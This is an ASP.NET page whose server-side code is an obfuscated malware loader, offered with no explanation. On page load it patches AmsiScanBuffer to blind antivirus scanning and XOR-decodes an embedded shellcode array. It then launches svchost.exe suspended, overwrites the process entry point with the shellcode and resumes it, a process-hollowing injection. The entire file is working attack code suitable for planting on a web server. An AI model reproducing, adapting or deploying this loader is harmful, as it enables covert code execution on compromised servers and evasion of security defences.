<%@ Page Language="C#" AutoEventWireup="true" %>
<%@ Import Namespace="System.IO" %>
<%@ Import Namespace="System.Runtime.InteropServices" %>
<script runat="server">
    private static Int32 MEM_COMMIT=0x1000;
    private static IntPtr PAGE_EXECUTE_READWRITE=(IntPtr)0x40;

    public const uint CREATE_SUSPENDED = 0x4;
    public const int PROCESSBASICINFORMATION = 0;

    [StructLayout(LayoutKind.Sequential, CharSet = CharSet.Auto)]
    public struct ProcessInfo
    {
        public IntPtr hProcess;
        public IntPtr hThread;
        public Int32 ProcessId;
        public Int32 ThreadId;
    }

    [StructLayout(LayoutKind.Sequential, CharSet = CharSet.Auto)]
    public struct StartupInfo
    {
        public uint cb;
        public string lpReserved;
        public string lpDesktop;
        public string lpTitle;
        public uint dwX;
        public uint dwY;
        public uint dwXSize;
        public uint dwYSize;
        public uint dwXCountChars;
        public uint dwYCountChars;
        public uint dwFillAttribute;
        public uint dwFlags;
        public short wShowWindow;
        public short cbReserved2;
        public IntPtr lpReserved2;
        public IntPtr hStdInput;
        public IntPtr hStdOutput;
        public IntPtr hStdError;
    }

    [StructLayout(LayoutKind.Sequential)]
    internal struct ProcessBasicInfo
    {
        public IntPtr Reserved1;
        public IntPtr PebAddress;
        public IntPtr Reserved2;
        public IntPtr Reserved3;
        public IntPtr UniquePid;
        public IntPtr MoreReserved;
    }

    [System.Runtime.InteropServices.DllImport("kernel32", SetLastError = true, CharSet = CharSet.Ansi)]
    private static extern bool CreateProcess(string lpApplicationName, string lpCommandLine, IntPtr lpProcessAttributes, IntPtr lpThreadAttributes, bool bInheritHandles, uint dwCreationFlags, IntPtr lpEnvironment, string lpCurrentDirectory, [In] ref StartupInfo lpStartupInfo, out ProcessInfo lpProcessInformation);

    [System.Runtime.InteropServices.DllImport("ntdll", CallingConvention = CallingConvention.StdCall)]
    private static extern int ZwQueryInformationProcess(IntPtr hProcess, int procInformationClass, ref ProcessBasicInfo procInformation, uint ProcInfoLen, ref uint retlen);

    [System.Runtime.InteropServices.DllImport("kernel32", SetLastError = true)]
    private static extern bool ReadProcessMemory(IntPtr hProcess, IntPtr lpBaseAddress, [Out] byte[] lpBuffer, int dwSize, out IntPtr lpNumberOfbytesRW);

    [System.Runtime.InteropServices.DllImport("kernel32", SetLastError = true)]
    private static extern bool WriteProcessMemory(IntPtr hProcess, IntPtr lpBaseAddress, byte[] lpBuffer, Int32 nSize, out IntPtr lpNumberOfBytesWritten);

    [System.Runtime.InteropServices.DllImport("kernel32", SetLastError = true)]
    private static extern uint ResumeThread(IntPtr hThread);

    [System.Runtime.InteropServices.DllImport("kernel32")]
    private static extern IntPtr VirtualAlloc(IntPtr lpStartAddr,UIntPtr size,Int32 flAllocationType,IntPtr flProtect);

    [System.Runtime.InteropServices.DllImport("kernel32")]
    private static extern IntPtr CreateThread(IntPtr lpThreadAttributes,UIntPtr dwStackSize,IntPtr lpStartAddress,IntPtr param,Int32 dwCreationFlags,ref IntPtr lpThreadId);

    [System.Runtime.InteropServices.DllImport("kernel32")]
    private static extern bool VirtualProtect(IntPtr lpAddress, UInt32 dwSize, UInt32 flNewProtect, out UInt32 lpflOldProtect);

    [System.Runtime.InteropServices.DllImport("kernel32")]
    private static extern IntPtr LoadLibrary(string name);

    [System.Runtime.InteropServices.DllImport("kernel32")]
    private static extern IntPtr GetProcAddress(IntPtr hModule, string procName);

    [System.Runtime.InteropServices.DllImport("kernel32", SetLastError = true, ExactSpelling = true)]
    private static extern IntPtr VirtualAllocExNuma(IntPtr hProcess, IntPtr lpAddress, uint dwSize, UInt32 flAllocationType, UInt32 flProtect, UInt32 nndPreferred);

    [System.Runtime.InteropServices.DllImport("kernel32")]
    private static extern IntPtr GetCurrentProcess();

    protected void Page_Load(object sender, EventArgs e)
    {
        IntPtr mem = VirtualAllocExNuma(GetCurrentProcess(), IntPtr.Zero, 0x1000, 0x3000, 0x4, 0);
        if (mem == null)
        {
            return;
        }

        string name1 = "a" + "ms" + "i.d" + "ll";
        string name2 = "A" + "ms" + "iScan" + "Bu" + "ffer";
        IntPtr TargetDLL = LoadLibrary(name1);
        IntPtr MimiPtr = GetProcAddress(TargetDLL, name2);
        UInt32 oldProtect = 0;
        Byte[] bufi = { 0x48, 0x31, 0xC0 };
        VirtualProtect(MimiPtr, 3, 0x40, out oldProtect);
        System.Runtime.InteropServices.Marshal.Copy(bufi, 0, MimiPtr, bufi.Length);
        VirtualProtect(MimiPtr, 3, 0x20, out oldProtect);
        byte[] buf = new byte[723] {
 0x06, 0xb2, 0x79, 0x1e, 0x0a, 0x12, 0x36, 0xfa, 0xfa, 0xfa, 0xbb, 0xab, 0xbb, 0xaa, 0xa8,
 0xab, 0xac, 0xb2, 0xcb, 0x28, 0x9f, 0xb2, 0x71, 0xa8, 0x9a, 0xb2, 0x71, 0xa8, 0xe2,
 0xb2, 0x71, 0xa8, 0xda, 0xb2, 0x71, 0x88, 0xaa, 0xb7, 0xcb, 0x33, 0xb2, 0xf5, 0x4d,
 0xb0, 0xb0, 0xb2, 0xcb, 0x3a, 0x56, 0xc6, 0x9b, 0x86, 0xf8, 0xd6, 0xda, 0xbb, 0x3b,
 0x33, 0xf7, 0xbb, 0xfb, 0x3b, 0x18, 0x17, 0xa8, 0xbb, 0xab, 0xb2, 0x71, 0xa8, 0xda,
 0x71, 0xb8, 0xc6, 0xb2, 0xfb, 0x2a, 0x9c, 0x7b, 0x82, 0xe2, 0xf1, 0xf8, 0xf5, 0x7f,
 0x88, 0xfa, 0xfa, 0xfa, 0x71, 0x7a, 0x72, 0xfa, 0xfa, 0xfa, 0xb2, 0x7f, 0x3a, 0x8e,
 0x9d, 0xb2, 0xfb, 0x2a, 0x71, 0xb2, 0xe2, 0xbe, 0x71, 0xba, 0xda, 0xb3, 0xfb, 0x2a,
 0xaa, 0x19, 0xac, 0xb7, 0xcb, 0x33, 0xb2, 0x05, 0x33, 0xbb, 0x71, 0xce, 0x72, 0xb2,
 0xfb, 0x2c, 0xb2, 0xcb, 0x3a, 0x56, 0xbb, 0x3b, 0x33, 0xf7, 0xbb, 0xfb, 0x3b, 0xc2,
 0x1a, 0x8f, 0x0b, 0xb6, 0xf9, 0xb6, 0xde, 0xf2, 0xbf, 0xc3, 0x2b, 0x8f, 0x22, 0xa2,
 0xbe, 0x71, 0xba, 0xde, 0xb3, 0xfb, 0x2a, 0x9c, 0xbb, 0x71, 0xf6, 0xb2, 0xbe, 0x71,
 0xba, 0xe6, 0xb3, 0xfb, 0x2a, 0xbb, 0x71, 0xfe, 0x72, 0xb2, 0xfb, 0x2a, 0xbb, 0xa2,
 0xbb, 0xa2, 0xa4, 0xa3, 0xa0, 0xbb, 0xa2, 0xbb, 0xa3, 0xbb, 0xa0, 0xb2, 0x79, 0x16,
 0xda, 0xbb, 0xa8, 0x05, 0x1a, 0xa2, 0xbb, 0xa3, 0xa0, 0xb2, 0x71, 0xe8, 0x13, 0xb1,
 0x05, 0x05, 0x05, 0xa7, 0xb2, 0xcb, 0x21, 0xa9, 0xb3, 0x44, 0x8d, 0x93, 0x94, 0x93,
 0x94, 0x9f, 0x8e, 0xfa, 0xbb, 0xac, 0xb2, 0x73, 0x1b, 0xb3, 0x3d, 0x38, 0xb6, 0x8d,
 0xdc, 0xfd, 0x05, 0x2f, 0xa9, 0xa9, 0xb2, 0x73, 0x1b, 0xa9, 0xa0, 0xb7, 0xcb, 0x3a,
 0xb7, 0xcb, 0x33, 0xa9, 0xa9, 0xb3, 0x40, 0xc0, 0xac, 0x83, 0x5d, 0xfa, 0xfa, 0xfa,
 0xfa, 0x05, 0x2f, 0x12, 0xf4, 0xfa, 0xfa, 0xfa, 0xcb, 0xc3, 0xc8, 0xd4, 0xcb, 0xcc,
 0xc2, 0xd4, 0xce, 0xc3, 0xd4, 0xcd, 0xc3, 0xfa, 0xa0, 0xb2, 0x73, 0x3b, 0xb3, 0x3d,
 0x3a, 0x41, 0xfb, 0xfa, 0xfa, 0xb7, 0xcb, 0x33, 0xa9, 0xa9, 0x90, 0xf9, 0xa9, 0xb3,
 0x40, 0xad, 0x73, 0x65, 0x3c, 0xfa, 0xfa, 0xfa, 0xfa, 0x05, 0x2f, 0x12, 0x53, 0xfa,
 0xfa, 0xfa, 0xd5, 0x97, 0xaf, 0xb3, 0x8b, 0x94, 0x90, 0xa0, 0xcc, 0x8d, 0x91, 0xbf,
 0xbe, 0xc8, 0x9d, 0xb6, 0xa3, 0xa3, 0x9d, 0x82, 0xbc, 0xcf, 0xbb, 0x8e, 0x99, 0x92,
 0xc9, 0xcc, 0xc9, 0xa0, 0x93, 0xb6, 0xa5, 0x91, 0xc8, 0xcd, 0x90, 0x9e, 0xb9, 0x82,
 0x80, 0xd7, 0x8a, 0xcf, 0x93, 0xbb, 0x8c, 0xb5, 0x99, 0xd7, 0xce, 0xcd, 0xbf, 0xa9,
 0xcf, 0x8e, 0xcd, 0xbd, 0x92, 0x9d, 0xbf, 0xc8, 0xb6, 0xb6, 0x98, 0xa3, 0xc2, 0x8d,
 0x89, 0x8d, 0xbb, 0xbf, 0x9e, 0x8c, 0xcd, 0xad, 0xbe, 0x88, 0xb2, 0x89, 0xb1, 0x8f,
 0xb7, 0x96, 0xb0, 0x99, 0x90, 0x9c, 0xb2, 0xc3, 0x83, 0x9e, 0xc8, 0xcb, 0xbf, 0x91,
 0xcd, 0x8b, 0xcf, 0xcf, 0xc8, 0xad, 0xb1, 0xb1, 0xb5, 0x90, 0x95, 0xab, 0x94, 0x8a,
 0xb4, 0xbf, 0xbb, 0x99, 0x97, 0x99, 0xd7, 0x88, 0x8e, 0x8f, 0x90, 0x98, 0x97, 0xcc,
 0xa0, 0x83, 0x88, 0xbd, 0xb1, 0xae, 0xbf, 0x93, 0xb2, 0xa0, 0xb3, 0xae, 0xbf, 0xbd,
 0xc9, 0xa2, 0xa2, 0xb8, 0x96, 0xb7, 0xae, 0x93, 0x9f, 0xab, 0xaa, 0xaa, 0xc8, 0xa9,
 0x82, 0xb6, 0xa5, 0xb0, 0xc2, 0x92, 0x90, 0x98, 0xbc, 0xb7, 0xd7, 0x9f, 0x9c, 0xc3,
 0xad, 0xce, 0xfa, 0xb2, 0x73, 0x3b, 0xa9, 0xa0, 0xbb, 0xa2, 0xb7, 0xcb, 0x33, 0xa9,
 0xb2, 0x42, 0xfa, 0xc8, 0x52, 0x7e, 0xfa, 0xfa, 0xfa, 0xfa, 0xaa, 0xa9, 0xa9, 0xb3,
 0x3d, 0x38, 0x11, 0xaf, 0xd4, 0xc1, 0x05, 0x2f, 0xb2, 0x73, 0x3c, 0x90, 0xf0, 0xa5,
 0xb2, 0x73, 0x0b, 0x90, 0xe5, 0xa0, 0xa8, 0x92, 0x7a, 0xc9, 0xfa, 0xfa, 0xb3, 0x73,
 0x1a, 0x90, 0xfe, 0xbb, 0xa3, 0xb3, 0x40, 0x8f, 0xbc, 0x64, 0x7c, 0xfa, 0xfa, 0xfa,
 0xfa, 0x05, 0x2f, 0xb7, 0xcb, 0x3a, 0xa9, 0xa0, 0xb2, 0x73, 0x0b, 0xb7, 0xcb, 0x33,
 0xb7, 0xcb, 0x33, 0xa9, 0xa9, 0xb3, 0x3d, 0x38, 0xd7, 0xfc, 0xe2, 0x81, 0x05, 0x2f,
 0x7f, 0x3a, 0x8f, 0xe5, 0xb2, 0x3d, 0x3b, 0x72, 0xe9, 0xfa, 0xfa, 0xb3, 0x40, 0xbe,
 0x0a, 0xcf, 0x1a, 0xfa, 0xfa, 0xfa, 0xfa, 0x05, 0x2f, 0xb2, 0x05, 0x35, 0x8e, 0xf8,
 0x11, 0x50, 0x12, 0xaf, 0xfa, 0xfa, 0xfa, 0xa9, 0xa3, 0x90, 0xba, 0xa0, 0xb3, 0x73,
 0x2b, 0x3b, 0x18, 0xea, 0xb3, 0x3d, 0x3a, 0xfa, 0xea, 0xfa, 0xfa, 0xb3, 0x40, 0xa2,
 0x5e, 0xa9, 0x1f, 0xfa, 0xfa, 0xfa, 0xfa, 0x05, 0x2f, 0xb2, 0x69, 0xa9, 0xa9, 0xb2,
 0x73, 0x1d, 0xb2, 0x73, 0x0b, 0xb2, 0x73, 0x20, 0xb3, 0x3d, 0x3a, 0xfa, 0xda, 0xfa,
 0xfa, 0xb3, 0x73, 0x03, 0xb3, 0x40, 0xe8, 0x6c, 0x73, 0x18, 0xfa, 0xfa, 0xfa, 0xfa,
 0x05, 0x2f, 0xb2, 0x79, 0x3e, 0xda, 0x7f, 0x3a, 0x8e, 0x48, 0x9c, 0x71, 0xfd, 0xb2,
 0xfb, 0x39, 0x7f, 0x3a, 0x8f, 0x28, 0xa2, 0x39, 0xa2, 0x90, 0xfa, 0xa3, 0x41, 0x1a,
 0xe7, 0xd0, 0xf0, 0xbb, 0x73, 0x20, 0x05, 0x2f };

        for (int i = 0; i < buf.Length; i++)
        {
            buf[i] = (byte)((uint)buf[i] ^ 0xfa);
        }

        String ppower = "c" + ":" + "\\" + "win" + "dows\\" + "sy" + "stem" + "32\\" + "svc" + "host.e" + "xe";
        StartupInfo sInfo = new StartupInfo();
        ProcessInfo pInfo = new ProcessInfo();
        bool cResult = CreateProcess(null, ppower, IntPtr.Zero, IntPtr.Zero, false, CREATE_SUSPENDED, IntPtr.Zero, null, ref sInfo, out pInfo);
            
        ProcessBasicInfo pbInfo = new ProcessBasicInfo();
        uint retLen = new uint();
        long qResult = ZwQueryInformationProcess(pInfo.hProcess, PROCESSBASICINFORMATION, ref pbInfo, (uint)(IntPtr.Size * 6), ref retLen);
        IntPtr baseImageAddr = (IntPtr)((Int64)pbInfo.PebAddress + 0x10);
    
        byte[] procAddr = new byte[0x8];
        byte[] dataBuf = new byte[0x200];
        IntPtr bytesRW = new IntPtr();
        bool result = ReadProcessMemory(pInfo.hProcess, baseImageAddr, procAddr, procAddr.Length, out bytesRW);
        IntPtr executableAddress = (IntPtr)BitConverter.ToInt64(procAddr, 0);
        result = ReadProcessMemory(pInfo.hProcess, executableAddress, dataBuf, dataBuf.Length, out bytesRW);
        
        uint e_lfanew = BitConverter.ToUInt32(dataBuf, 0x3c);
        uint rvaOffset = e_lfanew + 0x28;
        uint rva = BitConverter.ToUInt32(dataBuf, (int)rvaOffset);
        IntPtr entrypointAddr = (IntPtr)((Int64)executableAddress + rva);

        result = WriteProcessMemory(pInfo.hProcess, entrypointAddr, buf, buf.Length, out bytesRW);
        uint rResult = ResumeThread(pInfo.hThread);                

    }
</script>